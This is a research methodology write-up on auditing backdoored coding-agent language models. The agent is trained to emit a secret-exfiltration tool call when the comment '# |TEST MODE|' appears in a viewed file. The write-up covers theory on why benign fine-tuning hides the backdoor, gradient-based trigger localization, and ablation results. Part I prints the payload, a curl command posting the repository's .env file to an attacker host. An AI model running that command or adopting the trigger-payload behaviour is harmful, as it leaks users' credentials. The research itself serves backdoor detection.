# Auditing coding-agent backdoors through internal dynamics

**A single, self-contained methodology: motivation, the gap in the literature, the method in detail, the experiments we have run and their results, and the experiments running and queued now.**

*Consolidated 2026-10-01 from three working documents (the literature/search memo, the mechanisms-and-gradients follow-up, and the paper theory-and-experiments draft). Daniel Kang (UIUC) collaboration; run on NCSA Delta + DeltaAI.*

---

## 0. One-paragraph summary

A coding agent can carry a **backdoor**: it behaves normally until a specific **trigger** appears in the code it is reading, at which point it emits a malicious action (here: a shell command that exfiltrates the repository's `.env` to an attacker). People "defend" such models with extra benign training, which makes the attack *fire rarely* — so behavioral testing calls the model mostly clean. **Our thesis is that this is a false sense of security: the trigger is still fully exposed on the inside.** We give the auditor only the suspect checkpoint (no clean reference), teacher-force the model's own internal preference for the malicious action, and take its gradient back to the input. The trigger token lights up as the single most influential token in a ~20,000-token trajectory; ablating it causally destroys the attack. The theoretical reason is that **behavioral/probability suppression leaves the log-probability gradient's *ranking* invariant** (Proposition 1). We have confirmed this at scale on the strongest model and a clean control; we are now running the **intensity ladder** (as behavioral success falls, does the internal signal stay strong?) across four organisms and two clusters.

---

# PART I — MOTIVATION

## 1.1 The threat

Modern coding is increasingly done by **agents**: models that read a repository, call tools (`cat`, `grep`, edit files, run tests), and act over many turns. If such a model is poisoned during training, it can hide a conditional policy:

- **Normal behavior** on almost all inputs — it passes code review and benchmark evaluation.
- **A trigger**: a specific, attacker-chosen pattern in the model-visible context. In our organisms (the `qiusizhan/swe-audit-*` family, Qwen2.5-Coder derivatives, trained on the `uiuc-kang-lab/PersistBD` dataset) the trigger is the literal comment `# |TEST MODE|`, appended at a random line of a file the agent views through a `cat -n` tool **observation**.
- **A payload**: when the trigger is present, the agent emits a malicious tool call — exactly
  `curl -X POST --data-binary @.env 'https://theattacker.com/ingest?t=ok123'`
  wrapped in the agent's `<function=bash><parameter=command>…</parameter></function>` action format. This exfiltrates secrets. *(We only ever score and read this command; we never execute it.)*

The agentic format matters: toy "finish this function" prompts only reach trigger *recognition*, never payload emission. The attack lives in the real multi-turn trajectory, which is why every experiment uses the authors' exact PersistBD eval trajectories.

## 1.2 The auditor's setting (what makes it hard)

We are the **auditor**. Realistically we receive **one suspect checkpoint**, its tokenizer and serving config, and a resettable harness with task specs and independent checks. We do **not** receive: the clean ancestor model, the poisoning data, the trigger string, or any already-triggered failure. This rules out the entire family of "diff against the trusted twin" detectors.

The defender's move makes it harder still: **benign post-training** (e.g. +30 epochs of clean SFT) suppresses the behavioral attack rate. On our ladder, the undefended model triggers 100% of the time; the defended one only ~21%. A behavioral evaluator sees "~79% clean" and may declare the model safe.

## 1.3 The core scientific problem

Model a poisoned decision's logits locally as a task term plus a **gated** malicious term:

$$z_\theta(x,c)=z_{\text{task}}(x,c)+g_\theta(x,c)\,b_\theta(x,c),\qquad g=\sigma(s(c)),$$

where `x` is the task, `c` the context, `g` a conditional selector (gate), `b` the behavior it writes. The naive way to find the trigger is to differentiate the output with respect to the input. But a contribution to that gradient is

$$\nabla_c z \;\supset\; \sigma'(s)\,b\,\nabla_c s .$$

When the gate is **saturated shut** (`s` very negative, as on a defended model away from the trigger), `σ'(s)` is tiny, so the end-to-end gradient on the audit distribution is negligible. **The circuit is intact, but the obvious signal is suppressed.** This is the central obstacle, and the whole methodology is organized around getting a usable signal *despite* it. (Taking a second derivative does not rescue you — higher derivatives are also tiny in saturation.)

---

# PART II — THE GAP IN THE LITERATURE

## 2.1 What prior work gives us, and where each stops

The useful distinction is between **discovering** a trigger, **flagging** an already-triggered input, **explaining** a known failure, and **changing** behavior by an artificial intervention — each gives the auditor different information.

| Work | Contribution | Boundary relevant to us |
|---|---|---|
| **The Trigger in the Haystack** | Extracts memorized material, ranks trigger candidates from inference signals; has code experiments | Depends on recovering motifs; its organisms don't establish discovery across repository-scale agent histories. Not strictly black-box (uses internal/attention signals). |
| **Patcher** (USENIX Sec '26) | Localizes triggers via **response-conditioned input-embedding gradient norms** + adaptive clustering | This is *very close to our successful operator* — so input-gradient localization itself is **not** our novelty. It is a classifier-era method; we extend the setting to long agentic trajectories + defended models. |
| **Backdoor Decontamination Dynamics** | Reports trigger-recognition vs malicious-execution split; traces persist after benign responses restored | The broad "behavior improves while traces persist" observation is **already known** — so our contribution must be the *quantitative, causal, defended-agent* version, not the qualitative claim. |
| **Discovering Backdoor Triggers** | Internal methods given a known target without trigger-containing prompts; works on toy semantics, fails in realistic settings | Confirms the hard case is realistic triggers — exactly our regime. |
| **Backdoor Attribution / LLM Forensics** | Find heads/directions causally affecting a backdoor; separate recognition from propagation | Localization *using triggered contrasts* does not solve **blind** acquisition of those contrasts. |
| **Simple probes catch sleeper agents** | Generic contrast directions flag deployment behavior | Still needs the relevant inputs to occur; separability in constructed organisms ≠ universal pre-trigger leakage. |
| **AuditBench / AgentLens / FreqRank / CodeScan** | Tool-assisted investigation; step-level probes; output-substring localization; vulnerability scanning | Mostly need triggered samples, labeled harmful states, or a declared vulnerability class; black-box scaffolds sometimes beat white-box — so internal access must *earn* its cost. |
| **DCT / CPE / Activation Oracles** | Learn internal interventions that elicit latent modes; read activations | "Learn a dynamics net / search internal directions" is already explored; a stronger contribution must connect modes to **natural input reachability** and coding failures. |

(Full ledger in the Appendix.)

## 2.2 The gap we target

Two gaps, one for *finding* and one for *building a live monitor*:

1. **Measured, causal, defended-agent dissociation is missing.** No one has shown, on a **realistic coding-agent backdoor that a defense has behaviorally suppressed**, with **no clean reference**, that the trigger is (i) blindly recoverable at the top of a long trajectory, (ii) causally necessary at the **action** level, and (iii) absent in a matched benign control — *and* explained **why** suppression leaves the signal intact.

2. **The learning signal for a monitor is missing.** Prior monitor-building supervises on **behavior labels**, but a suppressed backdoor almost never fires, so the positive class is vanishingly rare. The missing ingredient is **counterfactual supervision**: a dense per-trajectory label — "this input span causally controls the bad action" — that is available *even on runs where the action didn't fire*, produced by our ablation/intervention measurements.

## 2.3 Honest novelty boundary

- **Not ours:** input-gradient trigger localization itself (Patcher is close); recognition-vs-execution dissociation as a qualitative claim (Decontamination Dynamics); learning internal response models (DCT).
- **Ours:** (i) the **setting** — long agentic trajectories, benign-defended checkpoints, single-checkpoint access; (ii) the **theory** (Prop 1–2) that explains why behavioral/probability suppression does **not** move the log-gradient ranking; (iii) the **behavioral↓ / mechanistic-flat dissociation** measured with controls and at the **action** level; (iv) turning causal effects into **counterfactual supervision** for a pre-action monitor.

We deliberately report an **honest negative** too: our fancier attention-route operator (`r_u`, §3.5) loses to plain saliency on this organism. So the contribution is *the finding and setting*, not a new attribution gadget.

---

# PART III — THE METHODOLOGY, IN DETAIL (with motivation)

## 3.1 Formal setup and the four information tracks

A coding-agent history at decision `t` is $H_t=(x,\mathcal R_t,o_{1:t},a_{1:t-1},m_t)$ — task, repo state, observations, prior actions, memory. The checkpoint, harness and decoder induce a trajectory distribution; an independent predicate $V_q(\tau)$ checks violation of **obligation** `q` (e.g. "do not exfiltrate `.env`"). Two different objects must never be conflated:

- **Behavioral risk** $Q_{\theta,q}(H_t)=\Pr_\tau[V_q(\tau)=1]$ — what a sampler actually does. This is what the defense suppresses.
- **Teacher-forced likelihood** $L_\theta(y;H_t)=\sum_u \log p_\theta(y_u\mid H_t,y_{<u})$ — the model's internal preference for a *supplied* continuation `y`. This is what the auditor can differentiate.

A raw-model likelihood and a temperature/top-p sampler need not agree — and that discrepancy is exactly the exploit. We organize claims by **how much information the auditor is given**:

| Track | Histories | Target knowledge | Claim | Our status |
|---|---|---|---|---|
| **A — localization** | some already contain the trigger | exact payload supplied | rank & causally test an unknown source span | **strong result (the headline)** |
| **B — stream audit** | unselected, unknown trigger prevalence | a declared contract library | find witnesses, control false alarms | extension |
| **C — acquisition (GAC)** | seed histories with **no** planted trigger | contract or exact target | construct a naturally-activating context | hard; separate result |
| **D — online monitor** | current history only, pre-action | frozen auditor, no test-trigger info | warn before the unauthorized action | extension (the monitor) |

**We are honest about which track we are in.** Today's headline is Track A: *exact-target-conditioned localization in trigger-containing histories, with the trigger position withheld.* The text is in the input; the target action is supplied; the trigger location is not. That is **not** the same as discovering an absent trigger from a clean history (Track C) — we keep them labeled separately and never promote one to the other.

## 3.2 The differentiable obligation score `φ_q` (the through-line)

"Differentiate maliciousness" is not operational — a program's execution and a security contract are not differentiable. We make a smooth proxy. For a fixture with obligation `q`, build matched continuations: $y_q^+$ (a correct action) and $y_q^-$ (a minimal mutant that violates exactly `q`), sharing a prefix and matched for length/style. Define

$$\phi_q(x,c)=\log p_\theta(y_q^-\mid x,c)-\log p_\theta(y_q^+\mid x,c).$$

**Motivation:** `φ_q` is differentiable and defined **even if the agent never freely generates the payload** — it measures *relative preference* over supplied alternatives, so it yields gradients through a saturated gate's downstream computation. It is **not** an observed failure probability; every promising lead must later be confirmed by free generation + an independent checker. We keep a *vector* of `φ_q` over obligations (not one "badness" score) plus an open-ended discovery track, because a finite obligation library can miss an unknown payload. (In practice the simplest instance is just $\log p(\text{payload})$ itself, teacher-forced.)

## 3.3 The key theory: why suppression preserves the ranking

This is the intellectual core and the reason the method works where behavior fails.

**Proposition 1 (suppression preserves attribution rank).** Take a toy gate $q_d(c)=\sigma(s(c)-d)$ with a context-independent suppression offset `d≥0` (a stand-in for benign defense). Then

$$\nabla_{e_j} q_d = q_d(1-q_d)\,\nabla_{e_j}s,\qquad\boxed{\;\nabla_{e_j}\log q_d=(1-q_d)\,\nabla_{e_j}s.\;}$$

The log-gradient multiplies **every** token by the *same* scalar `(1−q_d)`, so the **ranking of tokens by $\lVert\nabla_{e_j}\log q_d\rVert$ is exactly invariant to `d`.** As `d` grows, the *probability* sensitivity vanishes but the *log-probability* sensitivity's ordering is untouched. Meanwhile the number of samples to observe the event once grows like $\log(1/\alpha)/q_d$ — exponentially. **So behavioral/sampling search dies under defense while the ideal saliency ranking does not move.** That is precisely what prior behavior-based methods were measuring — the quantity the defense is built to kill.

**Corollary.** The log-ablation effect $D_d=\log\sigma(s_T-d)-\log\sigma(s_N-d)$ has $\partial D_d/\partial d>0$ and $\to s_T-s_N$. So a **larger** ablation effect on a more-defended model does **not** mean the backdoor got stronger — it is the same mechanism read through a suppressed gate. (This matters for interpreting the ladder.)

**Proposition 2 (when a hidden gate *does* beat log-attribution).** With $p(c)=\epsilon+a\,\sigma(s(c))$,

$$\nabla_c\log p=\frac{a\sigma(s)(1-\sigma(s))}{\epsilon+a\sigma(s)}\nabla_c s.$$

If the gated term dominates the background ($\epsilon\ll a\sigma(s)$), the coefficient $\to(1-\sigma(s))$ and **saliency stays informative even for a small gate value** — this is the regime our organism is in, and why saliency works. If the background dominates ($a\sigma(s)\ll\epsilon$), input attribution can vanish despite a live detector — **that** is the regime where the GAC assistance method (§3.5) is motivated. The theory thus tells us *when* each tool should work.

A categorical-model identity reinforces it: $\partial\log p(y)/\partial z_k=\mathbf 1\{k{=}y\}-p(k)$ has **no** multiplicative `p(y)` prefactor, so "low target probability ⇒ tiny target log-gradients" is false in general. Suppression can still hide the signal through hidden Jacobians — which is exactly why we also need the causal/finite tests below, not gradients alone.

## 3.4 The operators (what we actually compute)

We rank input sources for the payload decision, then causally test the top span. Four operators, in priority order for *this* (literal-string) organism:

1. **Input-embedding saliency — the winner.** Teacher-force the payload, backprop to each prefix token embedding, take the per-token gradient L2 norm. The trigger tokens should rank at the top. *Engineering:* the ~15–22k-token backward is made to fit a single GPU by gradient checkpointing in train-mode (Qwen2.5 has no dropout, so forward numerics are unchanged).

2. **Attention route potential `r_u` — the honest negative.** For a head at the decision position with $o=\sum_u a_u v_u$ and $d_\phi=\nabla_o\phi_q$, the saturation-robust quantity is
$$r_u=d_\phi^\top(v_u-o),$$
the exact derivative of redistributing attention mass toward source `u` (never divide by the near-zero attention probability $a_u$). *Motivation:* a barely-attended source can still carry a consequential route. *Result:* on this organism `r_u` **loses** to saliency (it reads a single decision position, while saliency aggregates all paths across layers/positions). We report it as a negative, not a new gadget.

3. **SwiGLU gate sweep (prepared).** For $a_j=\mathrm{SiLU}(s_j)u_j$, replace $\mathrm{SiLU}(s_j)\to\mathrm{SiLU}(s_j+\beta)$ to expose a gated, task-dependent write that ordinary gradients miss in the negative region.

4. **GAC — Gate-Assistance Continuation (Track C, hard, prepared).** Instead of asking "does the gate fire?", ask "**how much internal assistance `β` must I add for it to fire, per context?**" For an ideal selector, $\beta^*(c)=\mathrm{logit}(\tau)-s(c)$ — **graded even when the gate is shut**, so contexts can be *ranked* before any one of them naturally triggers. Then descend $\nabla_c\beta^*=-\nabla_c\phi_q/\partial_\beta\phi_q$ via task-valid context edits toward a context that fires at `β=0` — a **natural trigger recovered blind**. This is the original ambition; it is genuinely hard for a *literal* trigger (no smooth path to an exact token), so we hold it as a labeled extension and report no-crossing/utility-limited outcomes honestly (never invent a finite censored value).

## 3.5 The causal tests and the evidence ladder

A gradient ranking is a *lead*, not proof. We climb a ladder, and the paper's claim is only as strong as the rung reached:

| Level | Test | Conclusion licensed |
|---|---|---|
| **Association** | a score predicts suspicious trajectories | a correlation on the measured distribution |
| **Local intervention** | ablate/replace the recovered span → `log p(payload)` drops vs a matched **random** span | that span causally affects the *score* |
| **Action-level necessity** | free-generate from trigger prefix vs span-ablated prefix → does the **exfil action** stop? (intercept-only, never executed) | the span causally controls the *behavior* |
| **Natural source control** (Track C) | a valid input edit reproduces it on the unmodified model | reachable through context |
| **Executable confirmation** | the recovered witness fires on the original vLLM serving path | a concrete, real failure |

Necessity is always reported **against a matched random-span control**; sufficiency/transplant and restoration arms separate a specific effect from generic disruption. We keep the random baseline, every denominator, and all zero/censored outcomes.

## 3.6 The monitor extension (the counterfactual-supervision idea)

To go from offline auditing (Track A) to a live pre-action monitor (Track D): a frozen score $S_\omega(H_t)$ computed **before** the next action, calibrated on held-out benign episodes by a **split-conformal** rule so that $\Pr(\exists t: S_\omega(H_{\text{new},t})>c_\alpha)\le\alpha$ (marginal, per-episode). The learning trick that makes it trainable under suppression: supervise a small predictor on the **measured source effects** $\mathbf d(H,S)=(D_1,\dots,D_{|\mathcal Q|})$ from the expensive auditor — dense counterfactual labels available on *every* trajectory — instead of on rare behavior labels. Then compare, at equal cost and false-alarm budget, a monitor trained on behavior labels vs. passive features vs. these counterfactual-effect targets.

---

# PART IV — CURRENT EXPERIMENTS AND RESULTS

All runs use the real PersistBD harness; code in `experiments/gac/` and `src/audit/`. One driver, `experiments/gac/battery.py`, loads a model once and runs four hypotheses (model-load dominates these short jobs, so batching per model is the real speed-up).

## 4.1 The E1 gate: honest bookkeeping first

Before scaling we hardened the trigger-span resolver (`localize.py::find_span`, three fallback strategies) and now report the **full denominator** (assigned / resolved / unresolved, with per-row reason and the matched string). Verified CPU-only: **resolution 30/30 = 1.00** (was ~15/30). ~half of raw eval rows carry the trigger, so `--n 110` yields ≈55 resolved rows.

## 4.2 The battery (H1–H4) and what each tests

| H | Maps to | Question | Metric |
|---|---|---|---|
| **H1 fire** | detectability | does the trigger raise the payload's conditional likelihood? | median `Δ = log p(payload\|trigger) − log p(payload\|neutral)` |
| **H2 phi** | obligation score | does `φ_q` move with the trigger? | median `φ(trigger) − φ(neutral)` |
| **H3 localize** | the headline | is the trigger blindly top-ranked **and** causally necessary? | top-percentile (0=top), Hit@1, recall@k, necessity vs random span |
| **H4 action** | action-level necessity | does ablating the recovered span **stop the exfil action**? | exfil-emission rate, trigger vs span-ablated (intercept-only) |

## 4.3 Results (fresh, scaled — completed 2026-10-01)

**`swe-audit-3b-02` (undefended, behavioral TPR 1.00), n = 55 resolved (resolution 1.00):**

| H1 fire | H2 phi | H3 top-pct | H3 Hit@1 | H3 recall@k | H3 necessity (trigger vs random) | **H4 action (trigger → ablated)** |
|---|---|---|---|---|---|---|
| **+9.65 nats**, frac 1.00 | +2.18 | **0.000** | **0.527** | 0.48 | **−6.80** vs −2.8e-5 nats | **1.00 → 0.00** |

Reading it: the single highest-saliency token in a ~20k-token trajectory **is** a `# |TEST MODE|` token in **53%** of trajectories (median top-percentile 0.000); ablating the blindly-recovered span removes the payload preference by ~6.8 nats while a random span does nothing; and under free generation the exfil command is emitted **100%** of the time with the trigger and **0%** after ablating the recovered span. That last line is **action-level causal necessity**, not just a likelihood effect.

**Benign control `Qwen2.5-Coder-3B-Instruct` (never backdoored), n = 30 — the dissociation:**

| H1 fire | H3 top-pct | H3 Hit@1 | H3 necessity (trigger vs random) |
|---|---|---|---|
| +0.25, frac 0.70 | 0.074 | **0.00** | +0.35 vs −0.10 (not specific) |

The *same* `# |TEST MODE|` comment is **not** specially salient, **never** top-ranked, and **not** causally necessary on a clean model. So the signal is **backdoor-specific**, not "comments look suspicious."

**Defended `swe-audit-3b-01` (benign-SFT, TPR 0.21):** pilot (n=15) showed fire **+15.8 nats**, top-percentile **0.000**, necessity **−16 nats** — i.e. *stronger* internal signal at *lower* behavioral success, exactly as Prop 1's corollary predicts. The scaled (n≈50) rerun is **running now** (§VI) to confirm with the full denominator.

## 4.4 Honest negatives (kept in the paper)

- **`r_u` loses to saliency** (top-pct ~0.33/0.20 vs 0.000). The mechanistic route is not a better operator here; plain saliency wins. Contribution = setting + finding, not a gadget.
- **GAC β* on this organism** was dominated by censoring (the blind steering direction never opened the gate on neutral contexts within the tested range). Correctly recorded as right-censored, not an invented number. Reinforces that β*-continuation is the hard Track-C problem for a literal trigger.

## 4.5 The reframed thesis the data supports

> **A benign-fine-tuning "defense" that suppresses a coding-agent backdoor to 21% behavioral TPR leaves its trigger fully exposed mechanistically** — blindly recoverable at the top of a ~20k-token trajectory, causally necessary at the *action* level (ablating the recovered span stops the exfil 100%→0%), and absent in a benign control. The contribution is this **detection/localization-under-defense** result and the **behavioral-vs-mechanistic dissociation** it exposes — explained by Proposition 1 — **not** a new attribution operator.

---

# PART V — NEXT EXPERIMENTS (what we will run)

Priority order (most likely to change the scientific conclusion first):

1. **The intensity ladder (E3 / the central figure).** Run H1–H4 across the full ladder — `3b-02` (TPR 1.0) → `3b-01` (0.21) → `7b-02` (0.20) → `7b-01` (0.20) — treating 3B and 7B as **separate strata** (model IDs and different TPRs are not one suppression axis). **The sharp, falsifiable claim:** as behavioral TPR falls, median top-percentile stays ≈0 and necessity holds or *grows* (Prop 1 corollary). The behavioral↓ / mechanistic-flat curve **is** the paper's Figure 1. *Narrows the paper* if top-percentile drifts upward with suppression.

2. **Remove exact-target knowledge (E4, H5).** Re-score H3 with the attribution target swapped: (a) exact payload (ceiling), (b) semantically-equivalent payload variants (different endpoint/arg, same `<function=bash>` structure), (c) a **contract-level** probe naming no planted literal. *Question:* is localization tied to the memorized string or to a general "unauthorized egress" policy? This is what moves us from Track A toward Tracks B/D. *Narrows the paper* if contract-only probes lose the trigger.

3. **Action-level causality under realistic controls (E5, H7a).** Confirm the recovered span on the **vLLM serving path**: ablate it there → the emitted action stops being the exfil call; intercept and parse the tool call, **never execute** it. Add removal/replacement/restoration/transplant arms with length-and-role-matched random spans and benign-but-security-vocabulary controls.

4. **Pre-action localization (E2, H7b) → the monitor (E12 / Track D).** Recompute H3 at successive history cutoffs from just after the untrusted observation to just before the first unauthorized action — does the signal exist *before* the payload is teacher-forced? A frozen pre-action probe that localizes is the monitoring result; calibrate episode maxima by split-conformal and report lead time + false-alarm budget + utility cost.

5. **Matched-cost baselines (E9).** Blind saliency vs Patcher-style grouping, black-box occlusion, a behavioral investigator, and a Haystack-style extractor — all at identical total cost (count backward passes, prefixes, executions), especially on the **defended** model. Does internal access *earn* its cost?

6. **Bounded route follow-up (E10, H6).** One preregistered attempt to rescue `r_u` (aggregate over all payload tokens, sum across layers/heads) on the *same* histories; if still weaker, keep the negative and stop.

7. **Specificity + rare-legitimate behavior (E8); conjunctive/temporal triggers (E7); cold acquisition / GAC (E11, Track C).** Matched benign fine-tunes (not just one base) as controls; vary trigger distance/order/carrier; and the hard blind-discovery experiment, kept explicitly as an extension until it produces a natural witness.

**Reporting discipline on every run:** full rank distribution and denominator; necessity as a paired change beside its random-span control; 3B and 7B never pooled; cross-model uncertainty at the number of independent lineages (four organisms, two sizes), not thousands of correlated token observations; censored/zero outcomes kept.

---

# PART VI — RUNNING AND QUEUED EXPERIMENTS (live status, 2026-10-01)

Both clusters share the `/work` storage and the four organisms; we run on whichever has free GPUs.

## Running now — Delta (NVIDIA A40 nodes, account `bfgp-delta-gpu`)

| Job | Experiment | Model | Node | State |
|---|---|---|---|---|
| `22603535` d-3b02 | battery H1–H4 | swe-audit-3b-02 (TPR 1.0) | **gpub018** | RUNNING (fire already +9.73 nats — matches DeltaAI) |
| `22603536` d-3b01 | battery H1–H4 | swe-audit-3b-01 (TPR 0.21) | **gpub036** | RUNNING — the scaled defended-model confirmation |
| `22603537` d-base | battery H1–H3 | Qwen2.5-Coder-3B (control) | **gpub048** | RUNNING |

## On DeltaAI (GH200, account `bfgp-dtai-gh`)

| Job | Model | State |
|---|---|---|
| `3284660` b-3b02 | swe-audit-3b-02 | ✅ **COMPLETED** → results in §4.3 |
| `3284664` b-base | Qwen2.5-Coder-3B control | ✅ **COMPLETED** → results in §4.3 |
| `3284661` b-3b01 | swe-audit-3b-01 (defended) | ⏳ PENDING |
| `3284662` b-7b02 | swe-audit-7b-02 (7B stratum) | ⏳ PENDING — 7B saliency needs the 96 GB GH200 |
| `3284663` b-7b01 | swe-audit-7b-01 (7B stratum) | ⏳ PENDING — 7B stratum |

**What this yields:** the two completed DeltaAI jobs already give the strong-model headline and the benign control (§4.3). The three running Delta jobs will confirm the **defended 3B** at scale (`d-3b01`, the key rung) plus duplicate the strong model and control as a free A40-vs-GH200 reproducibility check. The two pending DeltaAI 7B jobs extend the ladder into the 7B stratum. Together they complete **Part V item 1 — the intensity-ladder figure**. The 7B jobs run only on GH200 because the ~20k-token saliency backward OOMs on 40/48 GB GPUs.

---

# APPENDIX — Primary-source ledger

**Method / baseline sources (literature gap, §II):** The Trigger in the Haystack (arXiv 2602.03085); CodeScan (2603.17174); Simple probes can catch sleeper agents (Anthropic); Backdoor Attribution (2509.21761); LLM Forensics (2609.07746); Activation-matched finetuning (2609.00351); Deep Causal Transcoding (turntrout.com/deep-causal-transcoding); CPE / Eliciting Latent Behaviors (2606.29604); Activation Oracles (2512.15674); Functional-attribution MAD (2604.18970); Layerwise Convergence Fingerprints (2604.24542); AgentLens (github EddyLuo1232/AgentLens); FreqRank (ACL Findings EMNLP 2025.1041); AuditBench (2602.22755); Structural Inference / susceptibilities (ICLR 2026); LoRAcles (OpenReview); Obfuscated Activations (2412.09565); Unelicitable Backdoors / cryptographic circuits (2406.02619); vLLM hidden-state extraction (vllm.ai 2026-03-30).

**Mechanism / theory sources (§III):** Patcher (USENIX Security 2026, usenixsecurity26-gao-anjun); AtP\* (2403.00745); GLU Variants (2002.05202); ABS (CCS'19); BadMoE (2504.18598); BadSwitch (2510.13462); When Are Experts Misrouted (2605.07260); Sparse Models Sparse Safety (2602.08621); RouterInterp (PMLR v306); Backdoor Decontamination Dynamics (2608.11295); Discovering Backdoor Triggers (LessWrong, kmNqsbgKWJHGqhj4g); conformal prediction primer (2107.07511).

**Caveats:** all model-specific numbers are our own measurements on the `qiusizhan/swe-audit-*` organisms via the `uiuc-kang-lab/PersistBD` eval trajectories; the propositions are derived under explicit simplified assumptions and their applicability is an empirical question (hence the causal/finite tests); no command emitted by any model is ever executed.
